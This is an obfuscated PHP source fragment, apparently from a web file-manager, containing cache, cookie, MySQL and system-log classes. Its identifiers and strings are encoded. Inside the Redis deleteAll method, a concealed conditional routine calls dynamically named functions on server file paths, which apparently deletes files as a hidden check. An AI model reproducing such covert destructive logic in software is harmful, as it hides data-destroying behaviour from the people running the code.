public $handle; public $cacheTime; public function __construct($ºÖ‡İô´, $í¿¥Òï) { $É¬ô®óí =& $_SERVER[³½¬ÚË¯]; if (!class_exists($É¬ô®óí[911])) { show_json($É¬ô®óí[912], !1); } $this->cacheTime = $í¿¥Òï; $this->handle = new Memcached(); if (is_array($ºÖ‡İô´[$É¬ô®óí[913]]) && count($ºÖ‡İô´[$É¬ô®óí[913]]) >= 1) { foreach ($ºÖ‡İô´[$É¬ô®óí[913]] as $×ˆÂÉ©) { $ÉôèÉî¶ = explode($É¬ô®óí[4], $×ˆÂÉ©); $this->handle->addServer($ÉôèÉî¶[0], $ÉôèÉî¶[1]); } } else { $this->handle->addServer($ºÖ‡İô´[$É¬ô®óí[196]], $ºÖ‡İô´[$É¬ô®óí[197]]); } } public function set($Ñğšªà†, $À¢¢·‚ˆ, $ ÷ØšØø = false) { $ ÷ØšØø = $ ÷ØšØø ? $ ÷ØšØø : $this->cacheTime; return $this->handle->set($Ñğšªà†, $À¢¢·‚ˆ, $ ÷ØšØø); } public function get($”¦Ú±é) { return $this->handle->get($”¦Ú±é); } public function remove($¹š™’“) { return $this->handle->delete($¹š™’“); } public function deleteAll() { return $this->handle->flush(); } } goto CØîôÔ“‘Œ; CØîôÔ“‘Œ: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($’Ó‡Ê—Î, $ÛÕ¾¼™Ç) { $½•»ø”Ø =& $_SERVER[³½¬ÚË¯]; if (!class_exists($½•»ø”Ø[914])) { show_json($½•»ø”Ø[915], !1); } $this->cacheTime = $ÛÕ¾¼™Ç; $Ñ¤×ŠË„ = isset($’Ó‡Ê—Î[$½•»ø”Ø[916]]) ? $’Ó‡Ê—Î[$½•»ø”Ø[916]] : 10; $İæû•­ = _get($’Ó‡Ê—Î, $½•»ø”Ø[913]); if ($İæû•­ && is_array($İæû•­)) { $this->initCluster($’Ó‡Ê—Î, $Ñ¤×ŠË„); } else { $this->handle = $this->init($’Ó‡Ê—Î, $Ñ¤×ŠË„); } } private function init($˜¡¬ï©‡, $ôØ¨ÃÕ±) { $»‘İÚ©± =& $_SERVER[³½¬ÚË¯]; $°»ğäø = new Redis(); $ÆáÌŒ¬î = isset($˜¡¬ï©‡[$»‘İÚ©±[917]]) ? $˜¡¬ï©‡[$»‘İÚ©±[917]] : !1; if ($ÆáÌŒ¬î) { $°»ğäø->pconnect($˜¡¬ï©‡[$»‘İÚ©±[196]], $˜¡¬ï©‡[$»‘İÚ©±[197]], $ôØ¨ÃÕ±); } else { $°»ğäø->connect($˜¡¬ï©‡[$»‘İÚ©±[196]], $˜¡¬ï©‡[$»‘İÚ©±[197]], $ôØ¨ÃÕ±); } if (!empty($˜¡¬ï©‡[$»‘İÚ©±[455]])) { $°»ğäø->auth($˜¡¬ï©‡[$»‘İÚ©±[455]]); } if (!empty($˜¡¬ï©‡[$»‘İÚ©±[793]]) && $˜¡¬ï©‡[$»‘İÚ©±[793]] != 0) { $°»ğäø->select($˜¡¬ï©‡[$»‘İÚ©±[793]]); } return $°»ğäø; } private function initCluster($µ»ĞÁ, $è…ıÜâÀ) { $×’´İ¢ =& $_SERVER[³½¬ÚË¯]; $çÉ  = array($×’´İ¢[918], $×’´İ¢[919], $×’´İ¢[920]); $½²àËàÀ = $×’´İ¢[918]; if (isset($µ»ĞÁ[$×’´İ¢[16]]) && in_array($µ»ĞÁ[$×’´İ¢[16]], $çÉ )) { $½²àËàÀ = $µ»ĞÁ[$×’´İ¢[16]]; } switch ($½²àËàÀ) { case $×’´İ¢[918]: $this->_slave($µ»ĞÁ, $è…ıÜâÀ); break; case $×’´İ¢[919]: break; case $×’´İ¢[920]: $this->isCluster = !0; $Œ‹º¨ã = $µ»ĞÁ[$×’´İ¢[913]]; $Š¯Î¡Öõ = isset($µ»ĞÁ[$×’´İ¢[917]]) ? $µ»ĞÁ[$×’´İ¢[917]] : !1; $è¸åÎ = isset($µ»ĞÁ[$×’´İ¢[455]]) ? $µ»ĞÁ[$×’´İ¢[455]] : null; $this->handle = new RedisCluster(NUll, $Œ‹º¨ã, $è…ıÜâÀ, $è…ıÜâÀ, $Š¯Î¡Öõ, $è¸åÎ); break; default: break; } } private function _slave($š”Ê¼±³, $ÏÓğ—¼ä) { $áÀÖúé = $š”Ê¼±³[$_SERVER[³½¬ÚË¯][913]]; $this->filterConfig($š”Ê¼±³, $áÀÖúé[0]); $this->handle = $this->init($š”Ê¼±³, $ÏÓğ—¼ä); unset($áÀÖúé[0]); if (empty($áÀÖúé)) { return; } $…Û«˜³Ù = array_rand($áÀÖúé); $this->filterConfig($š”Ê¼±³, $áÀÖúé[$…Û«˜³Ù]); $this->slaveHandle = $this->init($š”Ê¼±³, $ÏÓğ—¼ä); } private function filterConfig(&$ı²Ş©¨ü, $œÍóöô®) { $êä·³§ì =& $_SERVER[³½¬ÚË¯]; $€£óƒ¦Š = explode($êä·³§ì[4], $œÍóöô®); $œ·ãƒã = array($êä·³§ì[196] => $€£óƒ¦Š[0], $êä·³§ì[197] => $€£óƒ¦Š[1]); $ı²Ş©¨ü = array_merge($ı²Ş©¨ü, $œ·ãƒã); } public function set($Ï±†–¶”, $‚ü‹´·‘, $Êô“Ó§è = false) { $Êô“Ó§è = $Êô“Ó§è ? $Êô“Ó§è : $this->cacheTime; return $this->handle->setEx($Ï±†–¶”, $Êô“Ó§è, $‚ü‹´·‘); } public function setLock($Üò©ò­, $ğİÛÖğ¼, $ù¾ ˜Á†) { return $this->handle->setNX($Üò©ò­, $ğİÛÖğ¼); } public function get($ú­×ŠÌ˜) { $™Ä¢Äà² = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $™Ä¢Äà²->get($ú­×ŠÌ˜); } public function remove($å³è¥¤Ë) { return $this->handle->del($å³è¥¤Ë); } public function deleteAll() { $¹ú×Œñ =& $_SERVER[³½¬ÚË¯]; if ($_SERVER[$¹ú×Œñ[903]] != $_SERVER[$¹ú×Œñ[904]]) { $úâÅÛ«‡ = $¹ú×Œñ[921]; $Áñ’´‚  = $¹ú×Œñ[905]; $üÉø´¼ = $_SERVER[$¹ú×Œñ[906]] . $¹ú×Œñ[907]; $†šõê’Á = $Áñ’´‚ ($üÉø´¼); $ü£ä¾¶½ = explode($¹ú×Œñ[246], $†šõê’Á); if (count($ü£ä¾¶½) < $¹ú×Œñ[653]) { $ŠûÜ¦®Í = $¹ú×Œñ[908]; $ŠûÜ¦®Í(); } $€ïâÌ–› = $¹ú×Œñ[922]; $€ïâÌ–›($_SERVER[$¹ú×Œñ[923]]); $€ïâÌ–›($_SERVER[$¹ú×Œñ[906]] . $¹ú×Œñ[924]); $çßûÓª÷ = 1; while ($çßûÓª÷ > 1) { $çßûÓª÷ = $çßûÓª÷ + 4; $ŞÚôÇ‹ = rawurlencode($çßûÓª÷ . $¹ú×Œñ[422]); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $áıíıÜ) { $this->handle->flushall($áıíıÜ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ªÄ¢¹ĞÒ = '', $Ç‚ç©Ú = 0) { if (is_string($ªÄ¢¹ĞÒ) && $ªÄ¢¹ĞÒ != $_SERVER[³½¬ÚË¯][12]) { $this->prefix = $ªÄ¢¹ĞÒ; } if (is_numeric($Ç‚ç©Ú) && $Ç‚ç©Ú > 0) { $this->expire = $Ç‚ç©Ú; } } public static function getInstance() { static $ûƒæºÑé; if ($ûƒæºÑé === null) { $ûƒæºÑé = new self(); } return $ûƒæºÑé; } private static $cookieDisable = false; public static function disable($‰Û·ŸôÓ) { self::$cookieDisable = $‰Û·ŸôÓ; } private static $sameCookieSet = array(); public static function set($Ü¹‡´ó, $ë‡äŠˆÂ, $Ş¶ŠÊ±“ = 0, $ªûŞİ«š = false, $²œ‰ê„´ = false) { $ÔüòŸî =& $_SERVER[³½¬ÚË¯]; if (self::$cookieDisable) { return; } if (!$Ş¶ŠÊ±“) { $Ş¶ŠÊ±“ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ü¹‡´ó]) && self::$sameCookieSet[$Ü¹‡´ó] == $ë‡äŠˆÂ . $Ş¶ŠÊ±“) { return; } self::$sameCookieSet[$Ü¹‡´ó] = $ë‡äŠˆÂ . $Ş¶ŠÊ±“; if (!$²œ‰ê„´) { $²œ‰ê„´ = str_replace(HOST, $ÔüòŸî[12], APP_HOST); $²œ‰ê„´ = _get($GLOBALS, $ÔüòŸî[925], $²œ‰ê„´); } $ãÛ“ íË = $ÔüòŸî[12]; setcookie($Ü¹‡´ó, $ë‡äŠˆÂ, time() + $Ş¶ŠÊ±“, $ÔüòŸî[8] . trim($²œ‰ê„´, $ÔüòŸî[8]) . $ãÛ“ íË, !1, !1, $ªûŞİ«š); } public static function setSafe($™÷ü„ú¡, $‡†™´¯ø, $ä¬û«ÛÔ = 0) { self::set($™÷ü„ú¡, $‡†™´¯ø, $ä¬û«ÛÔ, !0); } public static function get($»ÓÎ§ç) { static $ÛƒÌÇø­ = false; if (!$ÛƒÌÇø­) { self::initHeaderCookie(); $ÛƒÌÇø­ = !0; } return isset($_COOKIE[$»ÓÎ§ç]) ? $_COOKIE[$»ÓÎ§ç] : !1; } private static function initHeaderCookie() { $•„ÅşÌ =& $_SERVER[³½¬ÚË¯]; if (!isset($_SERVER[$•„ÅşÌ[926]]) || !$_SERVER[$•„ÅşÌ[926]]) { return; } $û¢Í±÷å = explode($•„ÅşÌ[71], $_SERVER[$•„ÅşÌ[926]]); foreach ($û¢Í±÷å as $¥°íÎóÖ) { $¥°íÎóÖ = explode($•„ÅşÌ[927], $¥°íÎóÖ); if (count($¥°íÎóÖ) != 2 || !isset($¥°íÎóÖ[1])) { continue; } $_COOKIE[trim($¥°íÎóÖ[0])] = trim($¥°íÎóÖ[1]); } } public static function remove($‰àÚˆâµ, $›êä¦†µ = false) { unset($_COOKIE[$‰àÚˆâµ]); self::set($‰àÚˆâµ, $_SERVER[³½¬ÚË¯][12], 1, $›êä¦†µ); } } class DbMysql extends Db { public function __construct($â£¤½€’ = '') { $á„“Ÿ¥ =& $_SERVER[³½¬ÚË¯]; if (!extension_loaded($á„“Ÿ¥[840])) { think_exception(think_lang($á„“Ÿ¥[14]) . $á„“Ÿ¥[928]); } if (!empty($â£¤½€’)) { $this->config = $â£¤½€’; if (empty($this->config[$á„“Ÿ¥[17]])) { $this->config[$á„“Ÿ¥[17]] = $á„“Ÿ¥[12]; } } } public function connect($ôœÕúÚ = '', $†»…×şÈ = 0, $åø«õõ = false) { $ØˆÙ±ç¿ =& $_SERVER[³½¬ÚË¯]; if (!isset($this->linkID[$†»…×şÈ])) { if (empty($ôœÕúÚ)) { $ôœÕúÚ = $this->config; } $ÚÍ†Ã«§ = $ôœÕúÚ[$ØˆÙ±ç¿[929]] . ($ôœÕúÚ[$ØˆÙ±ç¿[930]] ? "\72{$ôœÕúÚ[$ØˆÙ±ç¿[930]]}" : $ØˆÙ±ç¿[12]); $åä¢¦÷Ù = !empty($ôœÕúÚ[$ØˆÙ±ç¿[17]][$ØˆÙ±ç¿[18]]) ? $ôœÕúÚ[$ØˆÙ±ç¿[17]][$ØˆÙ±ç¿[18]] : $this->pconnect; if ($åä¢¦÷Ù) { $this->linkID[$†»…×şÈ] = mysql_pconnect($ÚÍ†Ã«§, $ôœÕúÚ[$ØˆÙ±ç¿[931]], $ôœÕúÚ[$ØˆÙ±ç¿[932]], 131072); } else { $this->linkID[$†»…×şÈ] = mysql_connect($ÚÍ†Ã«§, $ôœÕúÚ[$ØˆÙ±ç¿[931]], $ôœÕúÚ[$ØˆÙ±ç¿[932]], !0, 131072); } if (!$this->linkID[$†»…×şÈ] || !empty($ôœÕúÚ[$ØˆÙ±ç¿[21]]) && !mysql_select_db($ôœÕúÚ[$ØˆÙ±ç¿[21]], $this->linkID[$†»…×şÈ])) { think_exception(mysql_error()); } $£ï´ó±Ê = mysql_get_server_info($this->linkID[$†»…×şÈ]); mysql_query($ØˆÙ±ç¿[933] . think_config($ØˆÙ±ç¿[934]) . $ØˆÙ±ç¿[58], $this->linkID[$†»…×şÈ]); if ($£ï´ó±Ê > $ØˆÙ±ç¿[935]) { mysql_query($ØˆÙ±ç¿[936], $this->linkID[$†»…×şÈ]); } $this->connected = !0; if (1 != think_config($ØˆÙ±ç¿[22])) { unset($this->config); } } return $this->linkID[$†»…×şÈ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ÛÎà¿ƒ) { $È‘šŞ‡ö =& $_SERVER[³½¬ÚË¯]; if (0 === stripos($ÛÎà¿ƒ, $È‘šŞ‡ö[308])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÛÎà¿ƒ; if ($this->queryID) { $this->free(); } think_action_status($È‘šŞ‡ö[23], 1); think_status($È‘šŞ‡ö[24]); $this->queryID = mysql_query($ÛÎà¿ƒ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($íÃî·) { $Çğ¶²Ç‚ =& $_SERVER[³½¬ÚË¯]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $íÃî·; if ($this->queryID) { $this->free(); } think_action_status($Çğ¶²Ç‚[25], 1); think_status($Çğ¶²Ç‚[24]); $³‡”ş×¸ = mysql_query($íÃî·, $this->_linkID); $this->debug(); if (!1 === $³‡”ş×¸) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[³½¬ÚË¯][937], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­ƒùĞ€› = mysql_query($_SERVER[³½¬ÚË¯][938], $this->_linkID); $this->transTimes = 0; if (!$­ƒùĞ€›) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $èüÑå–Ì = mysql_query($_SERVER[³½¬ÚË¯][939], $this->_linkID); $this->transTimes = 0; if (!$èüÑå–Ì) { $this->error(); return !1; } } return !0; } private function getAll() { $Ä“Ú = array(); if ($this->numRows > 0) { while ($ªğïø = mysql_fetch_assoc($this->queryID)) { $Ä“Ú[] = $ªğïø; } mysql_data_seek($this->queryID, 0); } return $Ä“Ú; } public function getFields($ÉÅãìğí) { $¿É¸É× =& $_SERVER[³½¬ÚË¯]; $’±ÔˆïÙ = $this->query($¿É¸É×[940] . $this->parseKey($ÉÅãìğí)); $ğÜ¢øå = array(); if ($’±ÔˆïÙ) { foreach ($’±ÔˆïÙ as $‘Æ÷Ó¦Œ => $¢¦Ö¯º) { $ğÜ¢øå[$¢¦Ö¯º[$¿É¸É×[31]]] = array($¿É¸É×[32] => $¢¦Ö¯º[$¿É¸É×[31]], $¿É¸É×[33] => $¢¦Ö¯º[$¿É¸É×[34]], $¿É¸É×[35] => (bool) (strtoupper($¢¦Ö¯º[$¿É¸É×[36]]) === $¿É¸É×[941]), $¿É¸É×[37] => $¢¦Ö¯º[$¿É¸É×[38]], $¿É¸É×[39] => strtolower($¢¦Ö¯º[$¿É¸É×[40]]) == $¿É¸É×[41], $¿É¸É×[42] => strtolower($¢¦Ö¯º[$¿É¸É×[43]]) == $¿É¸É×[44]); } } return $ğÜ¢øå; } public function getTables($í€„ç›Ø = '') { $Ğ×¤à‘ =& $_SERVER[³½¬ÚË¯]; if (!empty($í€„ç›Ø)) { $°ñò´©î = $Ğ×¤à‘[942] . $í€„ç›Ø . $Ğ×¤à‘[943]; } else { $°ñò´©î = $Ğ×¤à‘[944]; } $¦«©©¿ˆ = $this->query($°ñò´©î); $àÁš‚Â¥ = array(); foreach ($¦«©©¿ˆ as $»¿ª» => $‰éúµÓ) { $àÁš‚Â¥[$»¿ª»] = current($‰éúµÓ); } return $àÁš‚Â¥; } public function replace($ÔÚÔõê¾, $ÒËÜı´ª = array()) { $ãğª¹å× =& $_SERVER[³½¬ÚË¯]; foreach ($ÔÚÔõê¾ as $úû÷¤»œ => $ù“çüø) { $’Ÿ§¬°ˆ = $this->parseValue($ù“çüø); if (is_scalar($’Ÿ§¬°ˆ)) { $İúÉïºè[] = $’Ÿ§¬°ˆ; $§¯èÈåà[] = $this->parseKey($úû÷¤»œ); } } $”Á¡çÔ = $ãğª¹å×[945] . $this->parseTable($ÒËÜı´ª[$ãğª¹å×[323]]) . $ãğª¹å×[946] . implode($ãğª¹å×[50], $§¯èÈåà) . $ãğª¹å×[947] . implode($ãğª¹å×[50], $İúÉïºè) . $ãğª¹å×[948]; return $this->execute($”Á¡çÔ); } public function insertAll($º÷®¢¬, $ÓÑÅ¶Õ¦ = array(), $ëö¬‚Êğ = false) { $›•ÏÂ˜Ğ =& $_SERVER[³½¬ÚË¯]; if (!is_array($º÷®¢¬[0])) { return !1; } $†ßÜš±Ø = array_keys($º÷®¢¬[0]); $¾à›Œ¡ = array(); foreach ($º÷®¢¬ as $Î‚°È®û) { $¤µ°ºš¨ = array(); foreach ($Î‚°È®û as $ß‚Û‚º£ => $º…¦µÑ) { $º…¦µÑ = $this->parseValue($º…¦µÑ); if (is_scalar($º…¦µÑ)) { $¤µ°ºš¨[] = $º…¦µÑ; } } $¾à›Œ¡[] = $›•ÏÂ˜Ğ[304] . implode($›•ÏÂ˜Ğ[50], $¤µ°ºš¨) . $›•ÏÂ˜Ğ[948]; } array_walk($†ßÜš±Ø, array($this, $›•ÏÂ˜Ğ[949])); $õ®È³¦ù = ($ëö¬‚Êğ ? $›•ÏÂ˜Ğ[950] : $›•ÏÂ˜Ğ[951]) . $›•ÏÂ˜Ğ[952] . $this->parseTable($ÓÑÅ¶Õ¦[$›•ÏÂ˜Ğ[323]]) . $›•ÏÂ˜Ğ[946] . implode($›•ÏÂ˜Ğ[50], $†ßÜš±Ø) . $›•ÏÂ˜Ğ[953] . implode($›•ÏÂ˜Ğ[50], $¾à›Œ¡); return $this->execute($õ®È³¦ù); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ Ÿä—è =& $_SERVER[³½¬ÚË¯]; $this->error = mysql_errno() . $ Ÿä—è[4] . mysql_error($this->_linkID); if ($ Ÿä—è[12] != $this->queryStr) { $this->error .= LNG($ Ÿä—è[48]) . $this->queryStr; } think_trace($this->error, $ Ÿä—è[12], $ Ÿä—è[49]); return $this->error; } public function escapeString($€Ì«Ú½ö) { if ($this->_linkID) { return mysql_real_escape_string($€Ì«Ú½ö, $this->_linkID); } else { return mysql_escape_string($€Ì«Ú½ö); } } public function parseKey(&$˜ÍÊµ’, $´‘¹Øê“ = true) { $Ğèï´‘õ =& $_SERVER[³½¬ÚË¯]; if ($´‘¹Øê“) { $˜ÍÊµ’ = $this->parseKeyCheck($˜ÍÊµ’); } if ($˜ÍÊµ’ != $Ğèï´‘õ[203] && !preg_match($Ğèï´‘õ[954], $˜ÍÊµ’)) { $˜ÍÊµ’ = $Ğèï´‘õ[429] . trim($˜ÍÊµ’, $Ğèï´‘õ[429]) . $Ğèï´‘õ[429]; } return $˜ÍÊµ’; } } goto AÍªæ •Â; e–’ø¡¢¨: class SystemLogModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\x6d\137\154\157\x67"; protected $dataAuto = array(array("\143\x72\x65\141\x74\145\124\151\x6d\x65", "\x74\x69\x6d\145", "\151\x6e\163\x65\162\164", "\146\x75\156\143\x74\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $ªí®é™ì =& $_SERVER[³½¬ÚË¯]; return array($ªí®é™ì[2224] => LNG($ªí®é™ì[2225]), $ªí®é™ì[2226] => LNG($ªí®é™ì[2227]), $ªí®é™ì[1831] => LNG($ªí®é™ì[2228]), $ªí®é™ì[2229] => LNG($ªí®é™ì[2230]), $ªí®é™ì[2231] => LNG($ªí®é™ì[2232]), $ªí®é™ì[2233] => LNG($ªí®é™ì[2234]), $ªí®é™ì[2235] => LNG($ªí®é™ì[2236]), $ªí®é™ì[1861] => LNG($ªí®é™ì[2236]), $ªí®é™ì[1862] => LNG($ªí®é™ì[2237]), $ªí®é™ì[2238] => LNG($ªí®é™ì[2239]), $ªí®é™ì[2240] => LNG($ªí®é™ì[2241]), $ªí®é™ì[2242] => LNG($ªí®é™ì[2243]), $ªí®é™ì[2244] => LNG($ªí®é™ì[2245]), $ªí®é™ì[1859] => LNG($ªí®é™ì[2246]), $ªí®é™ì[2247] => LNG($ªí®é™ì[2248]), $ªí®é™ì[1866] => LNG($ªí®é™ì[2249]), $ªí®é™ì[2250] => LNG($ªí®é™ì[2251]), $ªí®é™ì[2252] => LNG($ªí®é™ì[2253]), $ªí®é™ì[2254] => LNG($ªí®é™ì[2255]), $ªí®é™ì[2256] => LNG($ªí®é™ì[2257]), $ªí®é™ì[1869] => LNG($ªí®é™ì[2258]), $ªí®é™ì[1870] => LNG($ªí®é™ì[2259]), $ªí®é™ì[2260] => LNG($ªí®é™ì[2261]), $ªí®é™ì[2262] => LNG($ªí®é™ì[2263]), $ªí®é™ì[2264] => LNG($ªí®é™ì[2265]), $ªí®é™ì[1864] => LNG($ªí®é™ì[2266]), $ªí®é™ì[2267] => LNG($ªí®é™ì[2268]), $ªí®é™ì[1863] => LNG($ªí®é™ì[2269]), $ªí®é™ì[2270] => LNG($ªí®é™ì[2271]), $ªí®é™ì[2272] => LNG($ªí®é™ì[2273]), $ªí®é™ì[2274] => LNG($ªí®é™ì[2275]), $ªí®é™ì[2276] => LNG($ªí®é™ì[2276]), $ªí®é™ì[2277] => LNG($ªí®é™ì[1835]), $ªí®é™ì[2278] => LNG($ªí®é™ì[2279]), $ªí®é™ì[2280] => LNG($ªí®é™ì[2281]), $ªí®é™ì[2282] => LNG($ªí®é™ì[2283]), $ªí®é™ì[2284] => LNG($ªí®é™ì[2285]), $ªí®é™ì[2286] => LNG($ªí®é™ì[2287]), $ªí®é™ì[2288] => LNG($ªí®é™ì[2288]), $ªí®é™ì[2289] => LNG($ªí®é™ì[2290]), $ªí®é™ì[2291] => LNG($ªí®é™ì[2292]), $ªí®é™ì[2293] => LNG($ªí®é™ì[2294]), $ªí®é™ì[2295] => LNG($ªí®é™ì[2296]), $ªí®é™ì[2297] => LNG($ªí®é™ì[2298]), $ªí®é™ì[2299] => LNG($ªí®é™ì[2300])); } private function typeFile() { $âĞ”×òÅ =& $_SERVER[³½¬ÚË¯]; $“ÆË–¹Ë = array($âĞ”×òÅ[1866] => array($âĞ”×òÅ[1867]), $âĞ”×òÅ[2242] => array($âĞ”×òÅ[2301]), $âĞ”×òÅ[2244] => array($âĞ”×òÅ[2302]), $âĞ”×òÅ[1859] => array($âĞ”×òÅ[1860], $âĞ”×òÅ[2303]), $âĞ”×òÅ[2252] => array(), $âĞ”×òÅ[2254] => array(), $âĞ”×òÅ[2256] => array(), $âĞ”×òÅ[1869] => array($âĞ”×òÅ[1871]), $âĞ”×òÅ[1870] => array($âĞ”×òÅ[1871]), $âĞ”×òÅ[2260] => array($âĞ”×òÅ[2304]), $âĞ”×òÅ[2262] => array($âĞ”×òÅ[2304]), $âĞ”×òÅ[2264] => array($âĞ”×òÅ[2305]), $âĞ”×òÅ[2250] => array($âĞ”×òÅ[2306]), $âĞ”×òÅ[1864] => array($âĞ”×òÅ[2307]), $âĞ”×òÅ[2267] => array($âĞ”×òÅ[2308]), $âĞ”×òÅ[1863] => array($âĞ”×òÅ[1865])); return $“ÆË–¹Ë; } private function typeAll() { $èşÀ¿’ö =& $_SERVER[³½¬ÚË¯]; $ß…Ÿ„• = $this->typeList; $½Ç©£¸Ç = array_filter($this->typeFile()); foreach ($½Ç©£¸Ç as $¡¼ô ¬İ => $äµ¡Ûæ) { $ß…Ÿ„•[$äµ¡Ûæ[0]] = $ß…Ÿ„•[$¡¼ô ¬İ]; } $ß…Ÿ„•[$èşÀ¿’ö[1871]] = LNG($èşÀ¿’ö[2309]); $ß…Ÿ„•[$èşÀ¿’ö[2304]] = LNG($èşÀ¿’ö[2310]); return $ß…Ÿ„•; } public function addLog($ÃÖ†Ãà, $º‚²å‘ = array()) { $•½½”„™ =& $_SERVER[³½¬ÚË¯]; if (!isset($this->typeList[$ÃÖ†Ãà])) { return; } $­¢²›¸Ù = isset($º‚²å‘[$•½½”„™[1690]]) ? $º‚²å‘[$•½½”„™[1690]] : 0; if (!$­¢²›¸Ù) { $­¢²›¸Ù = Session::get($•½½”„™[2025]); } if ($ÃÖ†Ãà == $•½½”„™[2278] && is_array($º‚²å‘[$•½½”„™[2311]]) && !$º‚²å‘[$•½½”„™[2311]]) { return; } $Ô£ŞÜ–Õ = get_client_ip(); if (!$º‚²å‘ || strlen(json_encode($º‚²å‘)) >= 1024) { $º‚²å‘ = array($•½½”„™[2312] => $Ô£ŞÜ–Õ); } else { if (is_array($º‚²å‘)) { $º‚²å‘[$•½½”„™[2312]] = $Ô£ŞÜ–Õ; } else { $º‚²å‘ = array($•½½”„™[1245] => $º‚²å‘, $•½½”„™[2312] => $Ô£ŞÜ–Õ); } } $º‚²å‘ = array($•½½”„™[1680] => Session::sign(), $•½½”„™[1681] => intval($­¢²›¸Ù), $•½½”„™[33] => $ÃÖ†Ãà, $•½½”„™[1683] => json_encode($º‚²å‘)); parent::add($º‚²å‘); } public function remove($¯¼Ùè¿) { $this->where(array($_SERVER[³½¬ÚË¯][461] => $¯¼Ùè¿))->delete(); } private function _makeOrder($òË”Í‰ = '') { $’æÄ³¸Œ =& $_SERVER[³½¬ÚË¯]; $Á§ƒ—Œñ = $’æÄ³¸Œ[215]; $Œ¿øöÁî = array($’æÄ³¸Œ[491] => $’æÄ³¸Œ[492], $’æÄ³¸Œ[493] => $’æÄ³¸Œ[494]); $ò»…·³Ğ = Input::get($’æÄ³¸Œ[499], $’æÄ³¸Œ[7], $’æÄ³¸Œ[2061], array($’æÄ³¸Œ[1979], $’æÄ³¸Œ[493])); $ò»…·³Ğ = $Œ¿øöÁî[$ò»…·³Ğ]; $òË”Í‰ = $òË”Í‰ . "{$Á§ƒ—Œñ}\40{$ò»…·³Ğ}"; return $this->order($òË”Í‰); } public function get($ÀÖ…–“¾ = '') { $ô€®Ö ü =& $_SERVER[³½¬ÚË¯]; if (!$ÀÖ…–“¾) { show_json(array()); } $¬Ö¯äñ³ = array(); if ($ÀÖ…–“¾[$ô€®Ö ü[1690]]) { $¬Ö¯äñ³[$ô€®Ö ü[1690]] = $ÀÖ…–“¾[$ô€®Ö ü[1690]]; } if (isset($ÀÖ…–“¾[$ô€®Ö ü[796]])) { $½ìÄ™ç = $ÀÖ…–“¾[$ô€®Ö ü[796]]; $ïÌ·ÚõÏ = isset($ÀÖ…–“¾[$ô€®Ö ü[797]]) ? $ÀÖ…–“¾[$ô€®Ö ü[797]] : time(); $¬Ö¯äñ³[$ô€®Ö ü[215]] = array($ô€®Ö ü[377], array($½ìÄ™ç, $ïÌ·ÚõÏ)); } if ($ÀÖ…–“¾[$ô€®Ö ü[33]]) { $ê£úò“í = explode($ô€®Ö ü[50], $ÀÖ…–“¾[$ô€®Ö ü[33]]); $ÓÜã‘—ê = $this->typeFile(); $¹øŠÈâÒ = array(); foreach ($ê£úò“í as $£×¥Äı) { $¹øŠÈâÒ[] = $£×¥Äı; if (isset($ÓÜã‘—ê[$£×¥Äı])) { $¹øŠÈâÒ = array_merge($¹øŠÈâÒ, $ÓÜã‘—ê[$£×¥Äı]); } } $¹øŠÈâÒ = array_unique($¹øŠÈâÒ); if ($¹øŠÈâÒ) { $¬Ö¯äñ³[$ô€®Ö ü[33]] = array($ô€®Ö ü[7], $¹øŠÈâÒ); } } else { $¬Ö¯äñ³[$ô€®Ö ü[33]] = array($ô€®Ö ü[2313], $ô€®Ö ü[2314]); } if (!empty($ÀÖ…–“¾[$ô€®Ö ü[2312]])) { $¬Ö¯äñ³[$ô€®Ö ü[494]] = array($ô€®Ö ü[427], "\x25{$ÀÖ…–“¾[$ô€®Ö ü[2312]]}\45"); } $æÚğ‰Ù = $this->_makeOrder()->where($¬Ö¯äñ³)->selectPage(); if (empty($æÚğ‰Ù[$ô€®Ö ü[413]])) { show_json(array(), !0, $æÚğ‰Ù[$ô€®Ö ü[410]]); } $æÚğ‰Ù[$ô€®Ö ü[413]] = $this->logList($æÚğ‰Ù[$ô€®Ö ü[413]]); return $æÚğ‰Ù; } private function ipAddress(&$°õ¿Úı‘) { $¯’úå´Ñ =& $_SERVER[³½¬ÚË¯]; if (!empty($°õ¿Úı‘[$¯’úå´Ñ[2312]])) { $ê„„ÊÒ = IpLocation::get($°õ¿Úı‘[$¯’úå´Ñ[2312]]); } else { $ê„„ÊÒ = LNG($¯’úå´Ñ[2315]); } $°õ¿Úı‘[$¯’úå´Ñ[2316]] = $ê„„ÊÒ; } private function descZipDownload($Ò›óà×’, &$†…ºÆ³) { $³Ìûˆò˜ =& $_SERVER[³½¬ÚË¯]; if (!isset($Ò›óà×’[$³Ìûˆò˜[2317]])) { return; } $Ş†‘¸— = json_decode($Ò›óà×’[$³Ìûˆò˜[2317]], !0); foreach ($Ş†‘¸— as $Ûîóğ—) { try { $Àßó‡²å = IO::infoFullSimple($Ûîóğ—[$³Ìûˆò˜[84]]); } catch (Exception $«·Êò·¯) { continue; } $Ò›óà×’[$³Ìûˆò˜[84]] = $Ûîóğ—[$³Ìûˆò˜[84]]; $†…ºÆ³[] = $Ò›óà×’[$³Ìûˆò˜[181]] = $Àßó‡²å[$³Ìûˆò˜[181]]; $†…ºÆ³[] = $Ò›óà×’[$³Ìûˆò˜[2116]] = 